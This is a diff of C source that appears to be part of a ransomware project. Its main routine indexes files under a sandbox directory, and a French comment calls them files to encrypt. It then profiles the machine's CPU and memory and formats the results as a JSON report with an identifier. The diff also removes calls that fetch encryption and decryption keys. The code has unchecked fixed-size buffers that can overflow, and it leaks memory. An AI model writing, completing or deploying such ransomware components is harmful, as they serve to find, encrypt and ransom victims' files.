@@ -1,11 +1,69 @@
 #include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 
-#include "server.h"
+#include "benchmark.h"
+#include "files_finder.h"
+
+char* json_body(char* p_identifier, benchmarkData* p_data, char* p_structKey) {
+    char* p_body = NULL;
+    p_body = (char*)malloc(250);
+    if (p_data == NULL)
+    {
+        sprintf(p_body, "{\"identifier\": \"%s\"}", p_identifier);
+    } else {
+
+        char* p_tmp = (char*)malloc(250);
+        /* Header json with identifier value */
+        sprintf(p_body, "{\n\"identifier\": \"%s\",\n", p_identifier);
+
+        /* Add the benchmark data */
+        sprintf(p_tmp, "\"%s\": {\n\t\"dataSize\": %d,\n\t", p_structKey, p_data->dataSize);
+        strcat(p_body, p_tmp);
+
+        sprintf(p_tmp, "\"cpuCore\": %d,\n\t", p_data->cpuCore);
+        strcat(p_body, p_tmp);
+
+        sprintf(p_tmp, "\"cpuMinFreq\": %f,\n\t", p_data->cpuMinFreq);
+        strcat(p_body, p_tmp);
+
+        sprintf(p_tmp, "\"cpuMaxFreq\": %f,\n\t", p_data->cpuMaxFreq);
+        strcat(p_body, p_tmp);
+
+        sprintf(p_tmp, "\"memorySize\": %d\n\t}\n", p_data->memorySize);
+        strcat(p_body, p_tmp);
+
+        strcat(p_body, "}");
+
+        free(p_tmp);
+    }
+
+    return p_body;
+}
 
 int main(int argc, char const *argv[])
 {
     /* code */
-    get_encryption_key("test");
-    get_decryption_key("test");
+
+    char* paths[] = {"/tmp/sandbox-ransomware/"};
+    /* Initialisation de la structure pour la recherche de fichier */
+    listFileData* p_listFileData = init_list_file_data();
+
+    /* Indexation des fichiers à chiffrer */
+    files_finder(p_listFileData, paths, 1);
+
+    /* Affichage des fichiers indexés */
+    //print_path_data(p_listFileData);
+
+    /* Benchmark */
+    benchmarkData* p_data = benchmark_pc(p_listFileData->totalSize);
+
+    /* Print benchmark data */
+    printf("json_body: %s\n", json_body("test", p_data, "benchmark"));
+
+    free_path_data(p_listFileData);
+    free(p_data);
+
     return 0;
 }
